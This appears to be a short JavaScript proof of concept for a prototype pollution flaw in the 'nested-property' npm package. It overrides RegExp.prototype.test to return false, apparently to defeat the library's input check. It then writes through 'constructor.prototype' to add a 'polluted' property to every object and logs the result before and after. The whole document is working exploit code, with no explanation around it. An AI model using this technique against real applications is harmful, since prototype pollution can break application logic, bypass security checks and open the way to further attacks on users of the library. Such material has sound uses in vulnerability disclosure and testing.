RegExp.prototype.test = () => false;
const nestedProperty = require('nested-property');
const object1 = {};
console.log({}.polluted);
nestedProperty.set(object1, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);